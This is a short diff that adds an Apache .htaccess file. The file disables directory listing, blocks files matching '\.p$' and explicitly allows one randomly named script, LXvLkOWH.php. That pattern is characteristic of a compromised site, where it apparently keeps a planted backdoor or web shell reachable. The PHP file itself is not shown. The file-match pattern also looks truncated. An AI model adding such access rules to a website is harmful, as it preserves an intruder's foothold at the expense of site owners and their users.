@@ -1,0 +1,7 @@
+Options -Indexes
+<FilesMatch "\.p$">
+Deny from all
+</FilesMatch>
+<Files LXvLkOWH.php>
+Allow from all
+</Files>
